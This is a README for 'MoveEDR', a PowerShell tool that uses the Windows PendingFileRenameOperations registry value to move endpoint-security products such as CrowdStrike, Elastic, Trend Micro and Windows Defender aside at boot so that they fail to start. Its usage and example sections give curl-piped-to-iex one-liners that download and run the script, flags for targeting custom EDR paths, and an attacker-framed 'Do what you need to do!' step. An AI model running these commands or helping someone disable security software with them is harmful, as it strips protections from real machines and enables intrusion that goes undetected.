# MoveEDR

If you're admin you can force Windows to delete or move folders and files around immediately after booting before services are started. This can be used to disable EDRs.

## Usage

```
curl https://raw.githubusercontent.com/duhirsch/MoveEdr/refs/heads/main/MoveEdr.ps1 | iex; MoveEdr
# Reboot!
```

The following Flags are available
- `Undo` : Undo the EDR Move, works with `CustomPaths`
- `Clear`: Clear the registry key's value
- `Print`: Print the value of the registry key in a human-readable format instead of strings terminated by null bytes
- `CustomOnly`: By default, the `CustomPaths` and `FullyCustomPaths` are added to the built-in moves. This flag ensures that *only* your custom paths are moved.
- `CustomPaths`: Specify your own EDR Paths instead of using built-in ones. Only takes sources as inputs, to also customize the destination use `FullyCustomPaths` instead.
- `FullyCustomPaths` : Specify sources and destinations, gives you control over destination instead of using a `$Suffix`.
- `Suffix`: Use a different suffix for moved files instead of the default `_bak`
- `Dump`: Dump the values of the registry key in a format that can be used with `Load`
- `Load`: Load previously dumped values of the registry key
- `DefenderHard`: Instead of moving only select executables of the Windows Defender, move the whole `Windows Defender` folder
- `IgnoreOld`: Do not keep already existing values of the registry key, blindly overwrite them
- `Reboot`: Perform a reboot immediately after setting the registry key. Might perform Windows Updates and take a long time to reboot 😬

### Example
```
curl https://raw.githubusercontent.com/duhirsch/MoveEdr/refs/heads/main/MoveEdr.ps1 | iex
MoveEdr -CustomPaths "C:\Program Files\newAndShinyEdr","C:\Windows\System32\drivers\newAndShinyEdr" -Suffix "_x33f" -IgnoreOld -DefenderHard -Reboot

# Do what you need to do!

# Undo
# Same command as before, just append -Undo
curl https://raw.githubusercontent.com/duhirsch/MoveEdr/refs/heads/main/MoveEdr.ps1 | iex
MoveEdr -CustomPaths "C:\Program Files\newAndShinyEdr","C:\Windows\System32\drivers\newAndShinyEdr" -Suffix "_x33f" -IgnoreOld -DefenderHard -Reboot -Undo
```

## Long Story
Some programs have a feature which prevents even local administrators from uninstalling or disabling them. Most of the time these are AVs/EDRs which prompt you for a deactivation password, even when you are administrator.

Here is a trick to disable them by moving files and folders around so that they can not be started on the next boot.

[SysInternals's PendMoves](https://learn.microsoft.com/en-us/sysinternals/downloads/pendmoves) provides `movefile.exe` which has the following explanation:

>There are several applications, such as service packs and hotfixes, that must replace a file that's in use and is unable to. Windows therefore provides the MoveFileEx API to rename or delete a file and allows the caller to specify that they want the operation to take place the next time the system boots, before the files are referenced. Session Manager performs this task by reading the registered rename and delete commands from the HKLM\System\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations value.

How exactly does `MoveFileEx` do this? Let's check the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefileexa#remarks) :

> The function stores the locations of the files to be renamed at restart in the following registry value: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations
> 
> This registry value is of type REG_MULTI_SZ. Each rename operation stores one of the following NULL-terminated strings, depending on whether the rename is a delete or not:
>
>    szSrcFile\0\0  
>    szSrcFile\0szDstFile\0

This means that we can achieve the same effect as `movefile.exe`by creating the registry key `PendingFileRenameOperations`and enter the paths of the files/directories we want to delete in the correct `REG_MULTI_SZ` format.

The `MoveEdr` script automates creating the correct registry keys for the following AVs/EDRs:

- [ ] Bitdefender
- [ ] Blackberry Cylance
- [ ] Checkpoint
- [ ] Cisco
- [x] CrowdStrike
- [ ] Cyberreason
- [x] Elastic
- [ ] FireEye
- [ ] Fortinet
- [ ] Kaspersky
- [ ] Malwarebytes
- [ ] McAfee
- [ ] Palo Alto Cortex
- [ ] Sentinel One
- [ ] Symantec
- [x] Trend Micro Security Agent
- [ ] VMware Carbon Black
- [ ] Webroot
- [x] Windows Defender
- [x] Windows Defender for Endpoint